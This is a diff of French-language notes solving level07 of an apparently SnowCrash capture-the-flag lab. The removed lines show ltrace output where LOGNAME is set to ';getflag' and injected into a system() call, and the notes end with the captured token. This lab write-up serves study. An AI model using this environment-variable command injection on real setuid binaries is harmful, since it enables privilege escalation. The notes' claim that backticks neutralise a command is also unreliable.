@@ -1,14 +1,26 @@
+je strings level07
+    [^_]
+    LOGNAME
+    /bin/echo %s 
+on voit que le binaire utilise /bin/echo pour print LOGNAME
+Je change LOGNAME en lui assignant getflag => ca print seulement getflag
 
+which getflag  => pour savoir ou se situe getflag
+chmod 777 .
+je creer un lien symbolique
+ln -s /bin/getflag getflag
+et j'assigne /bin/getflag a LOGNAME
+ca marche pas. ca print /bin/getflag mais ca n'execute pas la commande.
 
-getenv("LOGNAME")                                                              = ";getflag"
-asprintf(0xbffff714, 0x8048688, 0xbfffff51, 0xb7e5ee55, 0xb7fed280)            = 19
-system("/bin/echo ;getflag "
-Check flag.Here is your token :
-Nope there is no token here for you sorry. Try again :)
- <unfinished ...>
---- SIGCHLD (Child exited) ---
-<... system resumed> )                                                         = 0
-+++ exited (status 0) +++
-level07@SnowCrash:~$ ./level07
+how to assign a command to an environment variable in linux?
+    export MY_VARIABLE="command"
+    le problem ici, ca assigne le resultat de la commande a la variable d'environement.
 
-Check flag.Here is your token : fiumuikeil55xe9cu4dood66h  
+is there a way to neutralize the command while i assign it to the variable?
+    If you want to assign a command to an environment variable but neutralize it so that it is not executed immediately:
+    export MY_VARIABLE='command'
+    or 
+    export MY_VARIABLE=\`command\`
+
+token : fiumuikeil55xe9cu4dood66h
+
